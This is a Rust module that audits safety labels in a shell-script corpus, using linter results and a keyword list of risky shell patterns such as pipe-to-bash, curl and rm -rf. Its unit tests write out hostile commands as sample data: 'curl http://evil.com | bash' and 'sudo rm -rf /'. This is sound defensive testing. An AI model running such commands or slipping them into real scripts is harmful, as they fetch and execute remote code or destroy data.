//! Label audit for corpus safety labels (SSC v11 Section 5.3, F7 mitigation).
//!
//! Validates that "unsafe" labels derived from the transpiler are genuinely
//! unsafe. Contract C-LABEL-001: >= 90% of audited "unsafe" labels accurate.
//!
//! The audit checks each unsafe label against multiple validation signals
//! to catch transpiler-limitation false positives (e.g., scripts that fail
//! transpilation but are actually safe).

use crate::corpus::dataset::{classify_single, has_non_idempotent_pattern, has_unquoted_variable};
use crate::linter::lint_shell;
use serde::Serialize;

/// Result of auditing a single label.
#[derive(Debug, Clone, Serialize)]
pub struct LabelAuditResult {
    pub entry_id: String,
    pub script: String,
    pub assigned_label: u8,
    pub genuinely_unsafe: bool,
    pub signals: Vec<String>,
    pub reason: String,
}

/// Summary of the label audit (C-LABEL-001).
#[derive(Debug, Clone, Serialize)]
pub struct LabelAuditReport {
    pub total_audited: usize,
    pub genuinely_unsafe: usize,
    pub false_positives: usize,
    pub accuracy_pct: f64,
    pub passed: bool,
    pub results: Vec<LabelAuditResult>,
}

/// Signals that indicate genuine unsafety.
fn check_unsafe_signals(script: &str) -> Vec<String> {
    let mut signals = Vec::new();

    // 1. Linter findings
    let lint_result = lint_shell(script);
    let has_security = lint_result
        .diagnostics
        .iter()
        .any(|d| d.code.starts_with("SEC"));
    let has_det = lint_result
        .diagnostics
        .iter()
        .any(|d| d.code.starts_with("DET"));

    if has_security {
        signals.push("linter:security-finding".to_string());
    }
    if has_det {
        signals.push("linter:non-deterministic".to_string());
    }

    // 2. Known unsafe patterns (beyond linter rules)
    let known_patterns = [
        ("eval ", "eval-usage"),
        ("curl ", "curl-download"),
        ("wget ", "wget-download"),
        ("$RANDOM", "random-var"),
        ("$(date", "date-usage"),
        ("rm -rf", "recursive-delete"),
        ("chmod 777", "world-writable"),
        ("chmod +s", "setuid"),
        ("/dev/urandom", "urandom"),
        ("/dev/random", "random-device"),
        ("| bash", "pipe-to-bash"),
        ("| sh", "pipe-to-sh"),
        ("sudo ", "sudo-usage"),
        ("su -c", "su-command"),
    ];

    for (pattern, name) in &known_patterns {
        if script.contains(pattern) {
            signals.push(format!("pattern:{name}"));
        }
    }

    // 3. Structural checks
    if has_non_idempotent_pattern(script) {
        signals.push("structural:non-idempotent".to_string());
    }
    if has_unquoted_variable(script) {
        signals.push("structural:unquoted-var".to_string());
    }

    signals
}

/// Audit a single entry's label.
pub fn audit_label(entry_id: &str, script: &str, label: u8) -> LabelAuditResult {
    let signals = check_unsafe_signals(script);

    // An unsafe label (1) is genuine if there's at least one safety signal
    let genuinely_unsafe = if label == 1 {
        !signals.is_empty()
    } else {
        // Safe labels (0) — just verify
        true
    };

    let reason = if label == 1 && signals.is_empty() {
        "No unsafe signals found — possible transpiler-limitation false positive".to_string()
    } else if label == 1 {
        format!("Genuine unsafe: {} signals", signals.len())
    } else {
        "Labeled safe — no audit needed".to_string()
    };

    LabelAuditResult {
        entry_id: entry_id.to_string(),
        script: script.to_string(),
        assigned_label: label,
        genuinely_unsafe,
        signals,
        reason,
    }
}

/// Run label audit on a set of entries.
///
/// `entries` is a slice of (id, script, label) tuples.
/// Only entries with label=1 (unsafe) are audited.
pub fn run_label_audit(entries: &[(&str, &str, u8)]) -> LabelAuditReport {
    let unsafe_entries: Vec<_> = entries.iter().filter(|(_, _, l)| *l == 1).collect();
    let mut results = Vec::with_capacity(unsafe_entries.len());
    let mut genuinely_unsafe = 0;

    for (id, script, label) in &unsafe_entries {
        let result = audit_label(id, script, *label);
        if result.genuinely_unsafe {
            genuinely_unsafe += 1;
        }
        results.push(result);
    }

    let total = unsafe_entries.len();
    let false_positives = total - genuinely_unsafe;
    let accuracy_pct = if total > 0 {
        genuinely_unsafe as f64 / total as f64 * 100.0
    } else {
        100.0
    };

    LabelAuditReport {
        total_audited: total,
        genuinely_unsafe,
        false_positives,
        accuracy_pct,
        passed: accuracy_pct >= 90.0, // C-LABEL-001
        results,
    }
}

/// Run label audit on the first N unsafe entries from the corpus.
pub fn run_corpus_label_audit(limit: usize) -> LabelAuditReport {
    use crate::corpus::registry::CorpusRegistry;

    let registry = CorpusRegistry::load_full();
    let mut unsafe_entries = Vec::new();

    for entry in &registry.entries {
        let lint_result = lint_shell(&entry.input);
        let has_security = lint_result
            .diagnostics
            .iter()
            .any(|d| d.code.starts_with("SEC"));
        let has_det = lint_result
            .diagnostics
            .iter()
            .any(|d| d.code.starts_with("DET"));
        let row = classify_single(&entry.input, true, !has_security, !has_det);

        if row.label == 1 {
            unsafe_entries.push((entry.id.as_str(), entry.input.as_str(), row.label));
            if unsafe_entries.len() >= limit {
                break;
            }
        }
    }

    let entries: Vec<(&str, &str, u8)> = unsafe_entries
        .iter()
        .map(|(id, script, label)| (*id, *script, *label))
        .collect();

    run_label_audit(&entries)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_audit_genuinely_unsafe_eval() {
        let result = audit_label("test-1", "eval $x", 1);
        assert!(result.genuinely_unsafe);
        assert!(!result.signals.is_empty());
    }

    #[test]
    fn test_audit_genuinely_unsafe_curl_pipe() {
        let result = audit_label("test-2", "curl http://evil.com | bash", 1);
        assert!(result.genuinely_unsafe);
        assert!(result.signals.iter().any(|s| s.contains("curl")));
        assert!(result.signals.iter().any(|s| s.contains("pipe-to-bash")));
    }

    #[test]
    fn test_audit_safe_label_always_passes() {
        let result = audit_label("test-3", "echo hello", 0);
        assert!(result.genuinely_unsafe); // Safe labels always "pass" audit
    }

    #[test]
    fn test_audit_detects_non_determinism() {
        let result = audit_label("test-4", "echo $RANDOM", 1);
        assert!(result.genuinely_unsafe);
        assert!(result.signals.iter().any(|s| s.contains("random")));
    }

    #[test]
    fn test_run_label_audit_report() {
        let entries: Vec<(&str, &str, u8)> = vec![
            ("B-1", "eval $x", 1),
            ("B-2", "echo hello", 0),
            ("B-3", "curl http://evil.com | bash", 1),
            ("B-4", "echo $RANDOM", 1),
        ];

        let report = run_label_audit(&entries);
        assert_eq!(report.total_audited, 3); // Only unsafe entries audited
        assert_eq!(report.genuinely_unsafe, 3);
        assert_eq!(report.false_positives, 0);
        assert!(report.passed);
    }

    #[test]
    fn test_empty_audit() {
        let entries: Vec<(&str, &str, u8)> = vec![];
        let report = run_label_audit(&entries);
        assert_eq!(report.total_audited, 0);
        assert!(report.passed);
    }

    #[test]
    fn test_known_pattern_detection() {
        let signals = check_unsafe_signals("sudo rm -rf /");
        assert!(signals.iter().any(|s| s.contains("sudo")));
        assert!(signals.iter().any(|s| s.contains("recursive-delete")));
    }
}
